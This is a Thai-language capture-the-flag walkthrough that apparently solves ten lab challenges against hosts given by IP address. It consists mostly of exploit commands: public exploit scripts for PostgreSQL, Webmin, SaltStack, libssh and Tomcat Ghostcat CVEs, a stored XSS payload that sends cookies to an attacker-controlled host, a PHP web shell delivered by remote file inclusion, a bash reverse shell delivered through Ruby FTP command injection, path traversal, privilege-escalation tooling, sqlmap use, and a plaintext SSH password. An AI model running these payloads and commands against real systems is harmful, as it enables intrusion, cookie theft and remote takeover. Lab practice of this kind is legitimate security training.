🗼 Tower 0 – PostgreSQL RCE (CVE-2019-9193)
🔧 เป้าหมาย:

อ่านไฟล์ /tmp/flag.txt ผ่านช่องโหว่ PostgreSQL

✅ Step-by-step:

Check Port Open:

nmap -p 5432 136.110.46.225


Exploit CVE-2019-9193:

Clone script:

git clone https://github.com/vladislavmedvedev/CVE-2019-9193.git
cd CVE-2019-9193
python3 CVE-2019-9193.py 136.110.46.225 5432 postgres


อ่าน flag:

Command ใน shell: cat /tmp/flag.txt

🗼 Tower 1 – Stored XSS
🔧 เป้าหมาย:

โจมตีหน้า support ด้วย Stored XSS และให้ admin กด

✅ Step-by-step:

เปิดเว็บไซต์: http://34.87.33.218/support

ใส่ XSS Payload:

<script>new Image().src="http://YOUR-IP-HERE:PORT/?c="+document.cookie</script>


รอ admin เข้า แล้วดู log

sudo python3 -m http.server 80

หรือ nc -lvnp 80

หรือเปิดหน้า admin เพื่อดู flag

🗼 Tower 2 – LFI / RFI
🔧 เป้าหมาย:

อ่าน /tmp/flag.txt

✅ LFI Method:

ลอง path traversal:

curl "http://136.110.1.31/index.php?page=../../../../../../tmp/flag.txt"

✅ RFI Method:

สร้าง shell บน Kali:

echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000


เรียกผ่าน RFI:

curl "http://136.110.1.31/index.php?page=http://YOUR-IP:8000/shell.php&cmd=cat /tmp/flag.txt"

🗼 Tower 3 – Webmin RCE (CVE-2019-15107)
🔧 เป้าหมาย:

ใช้ช่องโหว่ Webmin อ่านไฟล์ /tmp/flag_random.txt

✅ Step-by-step:

ใช้ script exploit:

git clone https://github.com/Aytch3/CVE-2019-15107
cd CVE-2019-15107
python3 webmin_exploit.py -t 34.177.93.94 -p 10000 -c "cat /tmp/flag_random.txt"

🗼 Tower 4 – SaltStack RCE (CVE-2020-11651)
🔧 เป้าหมาย:

อ่าน /tmp/flag_xxxxx.txt

✅ Step-by-step:

ใช้ public exploit:

git clone https://github.com/rossengeorgiev/CVE-2020-11651
cd CVE-2020-11651
python3 saltstack_rce.py 34.87.46.136


เมื่อได้ shell: cat /tmp/flag_xxxxx.txt

🗼 Tower 5 – LibSSH Auth Bypass (CVE-2018-10933)
✅ Step-by-step:

ใช้ public exploit:

git clone https://github.com/0x27/libssh-auth-bypass.git
cd libssh-auth-bypass
python3 libssh-bypass.py 34.87.63.36 22


อ่าน flag:

cat /root/flag_xxxxxx.txt

🗼 Tower 6 – Privilege Escalation
✅ Step-by-step:

Login:

ssh noob@34.87.11.201 -p 4200
# password: N00bP@ssw0rd


ใช้ LinPEAS หรือ pspy:

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh


หา SUID / PATH Misconfig และยกระดับสิทธิ์

อ่าน flag: cat /root/flag_xxxxxx.txt

🗼 Tower 7 – Apache Tomcat Ghostcat (CVE-2020-1938)
✅ Step-by-step:

Nmap scan port:

nmap -p 8009 --script ajp-open --script ajp-methods 34.87.102.147


ใช้ exploit Ghostcat:

git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python3 ajpShooter.py -m read -f /root/flag.txt -u http://34.87.102.147

🗼 Tower 8 – CVE-2017-17405 (Ruby FTP Command Injection)
✅ Step-by-step:

สร้างไฟล์ |cmd บน FTP:

echo 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1' > shell.sh
python3 -m http.server 8000


Ngrok (port 21):

./ngrok tcp 21


Target download:

curl "http://34.124.149.106:8080/download?uri=ftp://0.tcp.ap.ngrok.io:PORT/&file=|bash shell.sh"


รับ shell:

nc -lvnp 4444
cat /usr/src/flag*

🗼 Tower 9 – WordPress Plugin Vulnerability
✅ Step-by-step:

wpscan:

wpscan --url http://35.240.142.53 --enumerate p


เจอ plugin ที่มี RCE / SQLi → ใช้ payload inject SQL / Code

เชื่อม DB ด้วย SQLmap:

sqlmap -u "http://35.240.142.53/wp-content/plugins/vuln.php?id=1" --dbs


ดึง flag จาก DB: select * from wp_flag_table
